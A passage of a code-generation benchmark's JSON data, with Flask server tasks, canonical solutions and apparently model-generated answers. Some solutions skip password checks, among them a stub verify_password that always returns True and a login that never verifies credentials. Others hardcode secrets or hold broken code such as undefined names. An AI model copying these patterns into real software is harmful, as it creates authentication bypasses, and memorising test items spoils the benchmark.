jsonify({\"error\": \"User not found\"}), 404\n        return jsonify(self.users[user_id])\n    \n    def list_users(self):\n        return jsonify(self.users)\n    \n    def create_user(self):\n        data = request.get_json()\n        if not data or 'name' not in data or 'email' not in data:\n            return jsonify({\"error\": \"Missing required fields\"}), 400\n        user_id = self.next_user_id\n        self.next_user_id += 1\n        user = {\n            \"id\": user_id,\n            \"name\": data['name'],\n            \"email\": data['email'],\n            \"created_at\": datetime.now().isoformat(),\n            \"updated_at\": datetime.now().isoformat()\n        }\n        self.users[user_id] = user\n        return jsonify(user), 201\n    \n    def update_user(self, user_id):\n        data = request.get_json()\n        if user_id not in self.users:\n            return jsonify({\"error\": \"User not found\"}), 404\n        if not data:\n            return jsonify({\"error\": \"No data provided\"}), 400\n        user = self.users[user_id]\n        for key, value in data.items():\n            if key in ['name', 'email']:\n                user[key] = value\n                user['updated_at'] = datetime.now().isoformat()\n        return jsonify(user)\n    \n    def delete_user(self, user_id):\n        if user_id not in self.users:\n            return jsonify({\"error\": \"User not found\"}), 404\n        del self.users[user_id]\n        return jsonify({\"message\": \"User deleted\"})\n    \n    def delete_order(self, order_id):\n        if order_id in self.deleted_orders:\n            return jsonify({\"error\": \"Order already deleted\"}), 400\n        self.deleted_orders.add(order_id)\n        return jsonify({\"message\": \"Order deleted\"})\n    \n    def check_auth(self):\n        auth_header = request.headers.get('Authorization')\n        if not auth_header:\n            return jsonify({\"error\": \"Authentication required\"}), 401\n    \n    def _after_request(self, response):\n        response.headers.set('Last-Modified', self.last_modified)\n        return response\n    \n    def run(self):\n        self.app.run(debug=True)"
  },
  {
    "Task_id": 153,
    "Instruction": "Task Description: Create a Flask-based HTTP server class that handles user authentication, request rate limiting, and database interactions, with the ability to run in both development and production environments.\n\nClass Description: FlaskServer is a class that encapsulates a Flask web application with user authentication, rate limiting, and database connectivity features. It provides routes for main page display and user login functionality, along with supporting methods for database operations and request handling.\n\nAttributes:\n- app: Flask - The Flask application instance\n- limiter: Limiter - Rate limiting controller for the application\n- SECRET_KEY: str - Secret key for session management\n\nMethods:\n- __init__() -> None - Initializes the Flask application, sets up rate limiting, and configures routes and secret key\n- _setup_routes() -> None - Defines all application routes and request handlers (internal method)\n- connect_db() -> sqlite3.Connection - Establishes connection to SQLite database\n- query_db(query: str, args: tuple = (), one: bool = False) -> Union[list, dict, None] - Executes database query and returns results\n- get_user_id(username: str) -> Union[int, None] - Retrieves user ID from database by username\n- papers_filter_version(papers: list, v: str) -> list - Filters papers by version number\n- default_context(papers: list, **kws) -> dict - Creates default template context with papers data\n- run(port: int = 5000, debug: bool = False, prod: bool = False) -> None - Starts the server in either development or production mode\n\nRoute Handlers (defined in _setup_routes):\n- before_request() -> None - Sets up database connection and user session before each request\n- teardown_request(exception: Exception) -> None - Closes database connection after each request\n- intmain() -> str - Handles root route, displays main page with papers\n- login() -> Response - Handles user login POST requests, manages authentication",
    "Canonical_solution": "from flask import Flask, request, session, url_for, redirect, render_template, abort, g, flash, _app_ctx_stack\nfrom flask_limiter import Limiter\nfrom werkzeug import check_password_hash, generate_password_hash\nimport pymongo\nimport time\nfrom sqlite3 import dbapi2 as sqlite3\n\nclass FlaskServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.limiter = Limiter(self.app, global_limits=[\"100 per hour\", \"20 per minute\"])\n        self._setup_routes()\n        \n        # Database configuration\n        if os.path.isfile('secret_key.txt'):\n            SECRET_KEY = open('secret_key.txt', 'r').read()\n        else:\n            SECRET_KEY = 'devkey, should be in a file'\n        self.app.config['SECRET_KEY'] = SECRET_KEY\n\n    def _setup_routes(self):\n        @self.app.before_request\n        def before_request():\n            g.db = self.connect_db()\n            g.user = None\n            if 'user_id' in session:\n                g.user = self.query_db('select * from user where user_id = ?',\n                                    [session['user_id']], one=True)\n\n        @self.app.teardown_request\n        def teardown_request(exception):\n            db = getattr(g, 'db', None)\n            if db is not None:\n                db.close()\n\n        @self.app.route(\"/\")\n        def intmain():\n            vstr = request.args.get('vfilter', 'all')\n            papers = [db[pid] for pid in DATE_SORTED_PIDS]\n            papers = self.papers_filter_version(papers, vstr)\n            ctx = self.default_context(papers, render_format='recent',\n                                    msg='Showing most recent Arxiv papers:')\n            return render_template('main.html', **ctx)\n\n        @self.app.route('/login', methods=['POST'])\n        def login():\n            if not request.form['username']:\n                flash('You have to enter a username')\n            elif not request.form['password']:\n                flash('You have to enter a password')\n            elif self.get_user_id(request.form['username']) is not None:\n                user = self.query_db('''select * from user where\n                    username = ?''', [request.form['username']], one=True)\n                if check_password_hash(user['pw_hash'], request.form['password']):\n                    session['user_id'] = self.get_user_id(request.form['username'])\n                    flash('User ' + request.form['username'] + ' logged in.')\n                else:\n                    flash('User ' + request.form['username'] + ' already exists, wrong password.')\n            else:\n                creation_time = int(time.time())\n                g.db.execute('''insert into user (username, pw_hash, creation_time) values (?, ?, ?)''',\n                    [request.form['username'], \n                    generate_password_hash(request.form['password']), \n                    creation_time])\n                user_id = g.db.execute('select last_insert_rowid()').fetchall()[0][0]\n                g.db.commit()\n                session['user_id'] = user_id\n                flash('New account %s created' % (request.form['username'], ))\n            return redirect(url_for('intmain'))\n\n    def connect_db(self):\n        sqlite_db = sqlite3.connect(Config.database_path)\n        sqlite_db.row_factory = sqlite3.Row\n        return sqlite_db\n\n    def query_db(self, query, args=(), one=False):\n        cur = g.db.execute(query, args)\n        rv = cur.fetchall()\n        return (rv[0] if rv else None) if one else rv\n\n    def get_user_id(self, username):\n        rv = self.query_db('select user_id from user where username = ?',\n                        [username], one=True)\n        return rv[0] if rv else None\n\n    def papers_filter_version(self, papers, v):\n        if v != '1': \n            return papers\n        intv = int(v)\n        filtered = [p for p in papers if p['_version'] == intv]\n        return filtered\n\n    def default_context(self, papers, **kws):\n        top_papers = self.encode_json(papers, args.num_results)\n        ans = dict(papers=top_papers, numresults=len(papers), totpapers=len(db), tweets=[], msg='', show_prompt='no', pid_to_users={})\n        ans.update(kws)\n        return ans\n\n    def run(self, port=5000, debug=False, prod=False):\n        if prod:\n            from tornado.wsgi import WSGIContainer\n            from tornado.httpserver import HTTPServer\n            from tornado.ioloop import IOLoop\n            from tornado.log import enable_pretty_logging\n            enable_pretty_logging()\n            http_server = HTTPServer(WSGIContainer(self.app))\n            http_server.listen(port)\n            IOLoop.instance().start()\n        else:\n            self.app.debug = debug\n            self.app.run(port=port, host='0.0.0.0')",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, redirect, url_for, render_template, session\nfrom flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\nimport sqlite3\nfrom typing import Union, List, Dict, Any\nimport os\n\nclass FlaskServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.limiter = Limiter(self.app, key_func=get_remote_address)\n        self.SECRET_KEY = os.urandom(24)\n        self.app.config['SECRET_KEY'] = self.SECRET_KEY\n        self._setup_routes()\n    \n    def _setup_routes(self):\n        @self.app.before_request\n        def before_request():\n            self.connect_db()\n        \n        @self.app.teardown_request\n        def teardown_request(exception):\n            self.close_db()\n        \n        @self.app.route('/')\n        def intmain():\n            papers = self.query_db('SELECT * FROM papers')\n            return self.default_context(papers)\n        \n        @self.app.route('/login', methods=['POST'])\n        def login():\n            username = request.form.get('username')\n            password = request.form.get('password')\n            user_id = self.get_user_id(username)\n            if user_id and self.verify_password(user_id, password):\n                session['user_id'] = user_id\n                return redirect(url_for('intmain'))\n            return 'Invalid credentials', 401\n    \n    def connect_db(self):\n        self.conn = sqlite3.connect('app.db')\n    \n    def close_db(self):\n        if self.conn:\n            self.conn.close()\n    \n    def query_db(self, query: str, args: tuple = (), one: bool = False) -> Union[List, Dict, None]:\n        cur = self.conn.cursor()\n        cur.execute(query, args)\n        rows = cur.fetchall()\n        if one:\n            return rows[0] if rows else None\n        return rows\n    \n    def get_user_id(self, username: str) -> Union[int, None]:\n        user = self.query_db('SELECT id FROM users WHERE username = ?', (username,))\n        return user[0][0] if user else None\n    \n    def verify_password(self, user_id: int, password: str) -> bool:\n        # In a real application, this would check against a hashed password\n        return True\n    \n    def papers_filter_version(self, papers: List[Dict], v: str) -> List[Dict]:\n        return [paper for paper in papers if paper.get('version') == v]\n    \n    def default_context(self, papers: List[Dict], **kws) -> Dict:\n        return {'papers': papers}\n    \n    def run(self, port: int = 5000, debug: bool = False, prod: bool = False):\n        if prod:\n            self.app.config['DEBUG'] = False\n        else:\n            self.app.config['DEBUG'] = debug\n        self.app.run(port=port)"
  },
  {
    "Task_id": 154,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests, including delayed responses, request type identification, and JSON responses.\n\nFunction Description: The code consists of three Flask route handlers that demonstrate different HTTP server functionalities. Each function handles a specific endpoint and performs a distinct operation.\n\nInput:\n- For '/respond' endpoint: \n  - Query parameter 'time' (integer): Time in milliseconds to sleep before responding\n- For '/request_type' endpoint: \n  - None (automatically receives request method via Flask's request object)\n- For '/json' endpoint: \n  - None\n\nOutput:\n- For '/respond' endpoint: \n  - Response text: 'Response from Flask' \n  - Headers: Sets 'Access-Control-Allow-Origin' to '*'\n- For '/request_type' endpoint: \n  - Response text: 'Request Type: [METHOD]' where [METHOD] is the HTTP method used\n  - Headers: Sets 'Access-Control-Allow-Origin' to '*'\n- For '/json' endpoint: \n  - Response: JSON object {'resp': 'Hello JSON!'}",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time = int(request.args.get('time', 0))\n    import time\n    time.sleep(time / 1000)\n    return 'Response from Flask', 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/request_type')\ndef request_type():\n    method = request.method\n    return f'Request Type: {method}', 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/json')\ndef json():\n    return jsonify({'resp': 'Hello JSON!'}), 200, {'Access-Control-Allow-Origin': '*'}\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 155,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that processes Pub/Sub messages from ArgoCD, transforms them into a standardized event format, and stores them in BigQuery.\n\nFunction Description: The function processes incoming HTTP POST requests containing Pub/Sub messages from ArgoCD. It validates the message structure, decodes and processes the event data, converts it to a standardized format, and stores it in BigQuery. Error handling is included for invalid payloads or processing failures.\n\nInput: \n- HTTP POST request with JSON payload containing Pub/Sub message in the following format:\n  {\n    \"message\": {\n      \"data\": [base64-encoded string],\n      \"message_id\": [string],\n      \"attributes\": [object]\n    }\n  }\n\nOutput: \n- HTTP 204 No Content response on successful processing\n- Error responses with appropriate status codes for invalid requests\n- Side effect: Processed event data is inserted into BigQuery\n\nMethods:\n\nprocess_argocd_event:\n- Input: msg [dict] - The Pub/Sub message dictionary containing the event data\n- Returns: dict - Processed event data in standardized format\n- Description: Decodes base64 message data, extracts metadata, and creates a standardized event object with unique signature\n\nindex:\n- Input: None (handles Flask request object internally)\n- Returns: str - Empty string with HTTP 204 status code\n- Description: Main endpoint that receives Pub/Sub messages, validates them, processes through process_argocd_event, and stores in BigQuery. Handles errors and logs failures.",
    "Canonical_solution": "import base64\nimport os\nimport json\nimport shared\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\ndef process_argocd_event(msg):\n    metadata = json.loads(base64.b64decode(msg[\"data\"]).decode(\"utf-8\").strip())\n\n    # Unique hash for the event\n    signature = shared.create_unique_id(msg)\n\n    argocd_event = {\n        \"event_type\": \"deployment\",  # Event type, eg \"push\", \"pull_reqest\", etc\n        \"id\": metadata[\"id\"],  # Object ID, eg pull request ID\n        \"metadata\": json.dumps(metadata),  # The body of the msg\n        \"time_created\": metadata[\"time\"],  # The timestamp of with the event\n        \"signature\": signature,  # The unique event signature\n        \"msg_id\": msg[\"message_id\"],  # The pubsub message id\n        \"source\": \"argocd\",  # The name of the source, eg \"github\"\n    }\n\n    print(argocd_event)\n    return argocd_event\n\n@app.route(\"/\", methods=[\"POST\"])\ndef index():\n    \"\"\"\n    Receives messages from a push subscription from Pub/Sub.\n    Parses the message, and inserts it into BigQuery.\n    \"\"\"\n    event = None\n    if not request.is_json:\n        raise Exception(\"Expecting JSON payload\")\n    envelope = request.get_json()\n    print(f\"envelope recieved: {envelope}\")\n\n    # Check that data has been posted\n    if not envelope:\n        raise Exception(\"Expecting JSON payload\")\n    # Check that message is a valid pub/sub message\n    if \"message\" not in envelope:\n        raise Exception(\"Not a valid Pub/Sub Message\")\n    msg = envelope[\"message\"]\n\n    if \"attributes\" not in msg:\n        raise Exception(\"Missing pubsub attributes\")\n\n    try:\n        event = process_argocd_event(msg)\n\n        # [Do not edit below]\n        shared.insert_row_into_bigquery(event)\n\n    except Exception as e:\n        entry = {\n                \"severity\": \"WARNING\",\n                \"msg\": \"Data not saved to BigQuery\",\n                \"errors\": str(e),\n                \"json_payload\": envelope\n            }\n        print(json.dumps(entry))\n\n    return \"\", 204",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport base64\nimport json\nimport logging\nfrom google.cloud import bigquery\n\napp = Flask(__name__)\nlogging.basicConfig(level=logging.INFO)\n\ndef process_argocd_event(msg):\n    try:\n        data = msg['message']['data']\n        message_id = msg['message']['message_id']\n        attributes = msg['message']['attributes']\n\n        # Decode the base64 data\n        decoded_data = base64.b64decode(data).decode('utf-8')\n        event = json.loads(decoded_data)\n\n        # Create standardized event object\n        standardized_event = {\n            'event_id': message_id,\n            'event_time': event.get('time', ''),\n            'event_type': event.get('type', ''),\n            'source': event.get('source', ''),\n            'data': event.get('data', {}),\n            'attributes': attributes,\n            'signature': f\"{message_id}-{event.get('time', '')}\"\n        }\n\n        return standardized_event\n    except Exception as e:\n        logging.error(f\"Error processing event: {str(e)}\")\n        raise\n\ndef insert_into_bigquery(event):\n    client = bigquery.Client()\n    dataset_ref = client.dataset(\"argocd_events\", project=\"your-project-id\")\n    table_ref = dataset_ref.table(\"events\")\n    rows_to_insert = [event]\n\n    try:\n        client.insert_table(table_ref, rows_to_insert)\n        logging.info(\"Event inserted into BigQuery\")\n    except Exception as e:\n        logging.error(f\"Error inserting into BigQuery: {str(e)}\")\n        raise\n\n@app.route('/index', methods=['POST'])\ndef index():\n    try:\n        msg = request.get_json()\n        if not msg or 'message' not in msg:\n            return jsonify({\"error\": \"Missing 'message' field in request\"}), 400\n\n        msg = msg['message']\n        if 'data' not in msg or 'message_id' not in msg or 'attributes' not in msg:\n            return jsonify({\"error\": \"Missing required fields in message\"}), 400\n\n        try:\n            processed_event = process_argocd_event(msg)\n            insert_into_bigquery(processed_event)\n            return '', 204\n        except Exception as e:\n            logging.error(f\"Error processing event: {str(e)}\")\n            return jsonify({\"error\": str(e)}), 500\n    except Exception as e:\n        logging.error(f\"Unexpected error: {str(e)}\")\n        return jsonify({\"error\": str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 156,
    "Instruction": "Task Description: Create a Flask-based web application class that handles user authentication, registration, and session management with role-based access control.\n\nClass Description: The WebApp class encapsulates a complete Flask web application with user authentication features. It includes database integration for user management, login/logout functionality, role-based access control, and session management.\n\nAttributes:\n\napp: [Flask] - The main Flask application instance\ndb: [SQLAlchemy] - Database instance for user management\nlogin_manager: [LoginManager] - Flask-Login manager for authentication\nUser: [SQLAlchemy Model] - Database model for user accounts\nSettingForm: [FlaskForm] - Form for password changes\nLoginForm: [FlaskForm] - Form for user login\nRegistrationForm: [FlaskForm] - Form for new user registration\nCaseForm: [FlaskForm] - Form for case management\n\nMethods:\n\n__init__: [None]() -> [None] - Initializes the Flask application, database, forms, and routes\nrun: [None](host='0.0.0.0', port=8080) -> [None] - Starts the Flask development server\nlogin_required: [function](role=\"ANY\") -> [function] - Decorator for role-based route protection\nload_user: [function](user_id) -> [User] - Callback for loading users from session\nunauthorized: [None]() -> [redirect] - Handler for unauthorized access attempts\nlogin: [function]() -> [response] - Handles user login requests\nsignup: [function]() -> [response] - Handles new user registration\nsetting: [function]() -> [response] - Handles user settings changes\nlogout: [function]() -> [redirect] - Handles user logout\nindex: [function]() -> [response] - Main application route",
    "Canonical_solution": "from flask import Flask, render_template, request, redirect, session\nfrom flask_login import UserMixin, LoginManager, login_user, logout_user, current_user\nfrom flask_sqlalchemy import SQLAlchemy\nfrom flask_wtf import FlaskForm\nfrom wtforms import StringField, PasswordField\nfrom wtforms.validators import ValidationError, DataRequired, EqualTo, Length\nimport os\nimport datetime\n\nclass WebApp:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.app.config[\"SESSION_COOKIE_SECURE\"] = False\n        self.app.config[\"SQLALCHEMY_TRACK_MODIFICATIONS\"] = False\n        self.app.config[\"SQLALCHEMY_DATABASE_URI\"] = \"sqlite:///logontracer.db\"\n        self.app.config[\"SECRET_KEY\"] = os.urandom(24)\n        self.app.permanent_session_lifetime = datetime.timedelta(minutes=60)\n        \n        self.db = SQLAlchemy(self.app)\n        self.login_manager = LoginManager()\n        self.login_manager.init_app(self.app)\n\n        class User(UserMixin, self.db.Model):\n            id = self.db.Column(self.db.Integer, primary_key=True)\n            username = self.db.Column(self.db.String(50), nullable=False, unique=True)\n            urole = self.db.Column(self.db.String(20))\n\n        class SettingForm(FlaskForm):\n            password1 = PasswordField('Password', validators=[DataRequired(), EqualTo('password2', message='Passwords must match.'), Length(min=3, max=20)])\n            password2 = PasswordField('Password (again)', validators=[DataRequired(), Length(min=3, max=20)])\n\n        class LoginForm(FlaskForm):\n            username = StringField('Username', validators=[DataRequired(), Length(min=3, max=50)])\n            password = PasswordField('Password', validators=[DataRequired(), Length(min=3, max=20)])\n\n        class RegistrationForm(FlaskForm):\n            username = StringField('Username', validators=[DataRequired(), Length(min=3, max=50)])\n            password1 = PasswordField('Password', validators=[DataRequired(), EqualTo('password2', message='Passwords must match.'), Length(min=3, max=20)])\n            password2 = PasswordField('Password (again)', validators=[DataRequired(), Length(min=3, max=20)])\n\n        class CaseForm(FlaskForm):\n            case = StringField('Case', validators=[DataRequired()])\n\n        with self.app.app_context():\n            self.db.create_all()\n\n        @self.login_manager.user_loader\n        def load_user(user_id):\n            return self.db.session.get(User, int(user_id))\n\n        @self.login_manager.unauthorized_handler\n        def unauthorized():\n            return redirect('/login')\n\n        @self.app.route('/login', methods=['GET', 'POST'])\n        def login():\n            if current_user.is_authenticated:\n                return redirect('/')\n\n            session.permanent = True\n            form = LoginForm(request.form)\n            if form.validate_on_submit():\n                username = form.username.data\n                password = form.password.data\n                remember = True if request.form.get(\"remember\") else False\n\n                session[\"username\"] = username\n                session[\"password\"] = password\n\n                user = User.query.filter_by(username=username).first()\n                login_user(user, remember=remember)\n                return redirect('/')\n\n            return render_template('login.html', form=form)\n\n        @self.app.route('/signup', methods=['GET', 'POST'])\n        @login_required(role=\"ADMIN\")\n        def signup():\n            form = RegistrationForm(request.form)\n            if form.validate_on_submit():\n                username = form.username.data\n                password = form.password1.data\n                admin = True if request.form.get(\"admin\") else False\n\n                with self.app.app_context():\n                    user = User(username=username, urole=\"ADMIN\" if admin else \"USER\")\n                    self.db.session.add(user)\n                    self.db.session.commit()\n\n                return redirect('/')\n            return render_template('signup.html', form=form)\n\n        @self.app.route('/setting', methods=['GET', 'POST'])\n        @login_required(role=\"ANY\")\n        def setting():\n            form = SettingForm(request.form)\n            if form.validate_on_submit():\n                username = current_user.username\n                password = form.password1.data\n\n                with self.app.app_context():\n                    user_query = User.query.filter_by(username=username).first()\n                    self.db.session.delete(user_query)\n                    self.db.session.commit()\n\n                    user = User(username=username, urole=user_query.urole)\n                    self.db.session.add(user)\n                    self.db.session.commit()\n\n                session[\"password\"] = password\n                return redirect('/')\n            return render_template('setting.html', form=form)\n\n        @self.app.route('/logout')\n        @login_required(role=\"ANY\")\n        def logout():\n            logout_user()\n            return redirect('/login')\n\n        @self.app.route('/')\n        @login_required(role=\"ANY\")\n        def index():\n            return render_template(\"index.html\")\n\n    def run(self, host='0.0.0.0', port=8080):\n        self.app.run(host=host, port=port)\n\n    def login_required(self, role=\"ANY\"):\n        def wrapper(fn):\n            @wraps(fn)\n            def decorated_view(*args, **kwargs):\n                if not current_user.is_authenticated:\n                    return self.login_manager.unauthorized()\n                urole = current_user.get_urole()\n                if ((urole != role) and (role != \"ANY\")):\n                    return self.login_manager.unauthorized()\n                return fn(*args, **kwargs)\n            return decorated_view\n        return wrapper",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template, redirect, url_for, request, flash\nfrom flask_sqlalchemy import SQLAlchemy\nfrom flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user\nfrom flask_wtf import FlaskForm\nfrom wtforms import StringField, PasswordField, SubmitField, TextAreaField\nfrom wtforms.validators import DataRequired, Email, EqualTo, Length\nimport uuid\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'your_secret_key'\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'\ndb = SQLAlchemy(app)\nlogin_manager = LoginManager(app)\nlogin_manager.login_view = 'login'\n\nclass User(db.Model, UserMixin):\n    id = db.Column(db.Integer, primary_key=True)\n    username = db.Column(db.String(20), unique=True, nullable=False)\n    email = db.Column(db.String(120), unique=True, nullable=False)\n    password = db.Column(db.String(60), nullable=False)\n    role = db.Column(db.String(20), default='user')\n\nclass SettingForm(FlaskForm):\n    old_password = PasswordField('Old Password', validators=[DataRequired()])\n    new_password = PasswordField('New Password', validators=[DataRequired(), Length(min=6)])\n    confirm_password = PasswordField('Confirm Password', validators=[DataRequired(), EqualTo('new_password')])\n    submit = SubmitField('Update')\n\nclass LoginForm(FlaskForm):\n    email = StringField('Email', validators=[DataRequired(), Email()])\n    password = PasswordField('Password', validators=[DataRequired()])\n    submit = SubmitField('Login')\n\nclass RegistrationForm(FlaskForm):\n    username = StringField('Username', validators=[DataRequired(), Length(min=4, max=20)])\n    email = StringField('Email', validators=[DataRequired(), Email()])\n    password = PasswordField('Password', validators=[DataRequired(), Length(min=6)])\n    confirm_password = PasswordField('Confirm Password', validators=[DataRequired(), EqualTo('password')])\n    submit = SubmitField('Register')\n\nclass CaseForm(FlaskForm):\n    title = StringField('Title', validators=[DataRequired()])\n    description = TextAreaField('Description', validators=[DataRequired()])\n    submit = SubmitField('Submit')\n\n@login_manager.user_loader\ndef load_user(user_id):\n    return User.query.get(int(user_id))\n\n@app.route('/')\ndef index():\n    if current_user.is_authenticated:\n        return f'Welcome, {current_user.username}! You are logged in.'\n    return 'You are not logged in. Please login or register.'\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    form = LoginForm()\n    if form.validate_on_submit():\n        user = User.query.filter_by(email=form.email.data).first()\n        if user and user.check_password(form.password.data):\n            login_user(user)\n            return redirect(url_for('index'))\n        else:\n            flash('Invalid email or password')\n    return render_template('login.html', form=form)\n\n@app.route('/signup', methods=['GET', 'POST'])\ndef signup():\n    form = RegistrationForm()\n    if form.validate_on_submit():\n        user = User(username=form.username.data, email=form.email.data, password=form.password.data)\n        db.session.add(user)\n        db.session.commit()\n        return redirect(url_for('login'))\n    return render_template('signup.html', form=form)\n\n@app.route('/setting', methods=['GET', 'POST'])\n@login_required\ndef setting():\n    form = SettingForm()\n    if form.validate_on_submit():\n        if current_user.check_password(form.old_password.data):\n            current_user.password = form.new_password.data\n            db.session.commit()\n            flash('Password updated successfully.')\n            return redirect(url_for('index'))\n        else:\n            flash('Old password is incorrect.')\n    return render_template('setting.html', form=form)\n\n@app.route('/logout')\ndef logout():\n    logout_user()\n    return redirect(url_for('index'))\n\n@app.route('/case', methods=['GET', 'POST'])\n@login_required\ndef case():\n    form = CaseForm()\n    if form.validate_on_submit():\n        # Here you would save the case to the database\n        flash('Case submitted successfully.')\n        return redirect(url_for('index'))\n    return render_template('case.html', form=form)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)"
  },
  {
    "Task_id": 157,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that receives JSON data, processes it using a pre-trained machine learning model, and returns predictions in JSON format.\n\nFunction Description: The function handles POST requests to the '/predict' endpoint. It receives JSON data, validates it, loads a pre-trained model, makes predictions, and returns the results. It also includes error handling for bad requests.\n\nInput: \n- HTTP POST request with JSON payload containing data for prediction\n- The function accesses this through Flask's request.get_json()\n\nOutput:\n- Successful case: JSON response containing prediction results with HTTP status code 200\n- Error case: JSON error message with HTTP status code 400 for bad requests",
    "Canonical_solution": "from flask import Flask, jsonify, request\n\napp = Flask(__name__)\n\n@app.route('/predict', methods=['POST'])\ndef apicall():\n    try:\n        test_json = request.get_json()\n        test = pd.read_json(test_json)\n        print(\"The test data received are as follows...\")\n        print(test)\n        print()\n\n    except Exception as e:\n        raise e\n\n    clf = 'lm_model_v1.pk'\n    \n    if test.empty:\n        return(bad_request())\n    else:\n        print(\"Loading the model...\")\n        loaded_model = None\n        with open('./models/'+clf,'rb') as f:\n            loaded_model = pickle.load(f)\n\n        print(\"The model has been loaded...doing predictions now...\")\n        print()\n        predictions = loaded_model.predict(test)\n            \n        prediction_series = pd.Series(predictions)\n        response = jsonify(prediction_series.to_json())\n        response.status_code = 200\n        return (response)\n\n@app.errorhandler(400)\ndef bad_request(error=None):\n    message = {\n            'status': 400,\n            'message': 'Bad Request: ' + request.url + '--> Please check your data payload...',\n    }\n    resp = jsonify(message)\n    resp.status_code = 400\n\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\n# Pre-trained model (simulated)\nclass PreTrainedModel:\n    def predict(self, data):\n        # Simulate prediction\n        return {\"prediction\": \"result_based_on_input\"}\n\nmodel = PreTrainedModel()\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    data = request.get_json(force=True)\n    if not data:\n        return jsonify({\"error\": \"No JSON data provided\"}), 400\n\n    try:\n        # Validate data (example validation)\n        if 'input' not in data or not isinstance(data['input'], list):\n            return jsonify({\"error\": \"Invalid input format\"}), 400\n\n        # Process data with the model\n        result = model.predict(data)\n        return jsonify(result), 200\n\n    except Exception as e:\n        return jsonify({\"error\": str(e)}), 400\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 159,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles image processing and video generation requests, including live preview streaming and final video download capabilities.\n\nFunction Description: The code implements a Flask web server with four main endpoints:\n1. Serves a static HTML interface\n2. Accepts image uploads for processing\n3. Provides a live MJPEG stream of processed frames\n4. Generates and returns a final processed video file\n\nInput:\n- HTTP GET/POST requests to defined endpoints\n- Image data as base64-encoded strings via POST\n- Configuration parameters for image processing\n\nOutput:\n- Static HTML page for the interface\n- Live MJPEG stream of processed frames\n- Processed MP4 video file for download\n- Empty responses for successful operations\n\nMethods:\n\nindex() -> flask.Response - Serves the static HTML interface file\n- Input: None\n- Output: Static HTML file response\n\nload_image() -> str - Processes uploaded image data\n- Input: \n  - strFile: Filename string\n  - strData: Base64-encoded image data\n- Output: Empty string response\n\nget_live() -> flask.Response - Generates MJPEG live stream\n- Input: None\n- Output: Multipart MJPEG stream response\n\nget_result() -> flask.Response - Generates and returns processed video\n- Input: None\n- Output: MP4 video file attachment\n\nNote: The implementation uses gevent for asynchronous handling and includes image processing utilities (process_load, process_inpaint, process_kenburns) which are assumed to be defined elsewhere. The server runs on port 8080 and serves static files from the current directory.",
    "Canonical_solution": "import flask\nimport gevent\nimport gevent.pywsgi\nimport os\nimport time\nimport tempfile\nimport random\nimport numpy\nimport cv2\nimport base64\nimport io\nimport shutil\nimport moviepy\n\nobjFlask = flask.Flask(import_name=__name__, static_url_path='', static_folder=os.path.abspath('./'))\nobjFlask.json.sort_keys = False\n\n@objFlask.route(rule='/', methods=[ 'GET' ])\ndef index():\n\treturn objFlask.send_static_file('interface.html')\n\n@objFlask.route(rule='/load_image', methods=[ 'POST' ])\ndef load_image():\n\tobjPlayback['strImage'] = flask.request.form['strFile']\n\tobjPlayback['npyImage'] = numpy.ascontiguousarray(cv2.imdecode(buf=numpy.frombuffer(base64.b64decode(flask.request.form['strData'].split(';base64,')[1]), numpy.uint8), flags=-1)[:, :, 0:3])\n\tobjPlayback['strCache'] = {}\n\n\tprocess_load(objPlayback['npyImage'], {})\n\n\tfor fltX, fltY in [ (100.0, 0.0), (-100.0, 0.0), (0.0, 100.0), (0.0, -100.0) ]:\n\t\tprocess_inpaint(torch.tensor(data=[[[fltX], [fltY], [0.0]]], dtype=torch.float32, device=torch.device('cuda')))\n\t# end\n\n\treturn ''\n\n@objFlask.route(rule='/get_live', methods=[ 'GET' ])\ndef get_live():\n\tdef generator():\n\t\tfltFramelimiter = 0.0\n\n\t\twhile True:\n\t\t\tfor intYield in range(100): gevent.sleep(0.0)\n\n\t\t\tgevent.sleep(max(0.0, (1.0 / 25.0) - (time.time() - fltFramelimiter))); fltFramelimiter = time.time()\n\n\t\t\tif objPlayback['strImage'] is None:\n\t\t\t\tyield b'--frame\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n' + cv2.imencode(ext='.jpg', img=numpy.ones([ 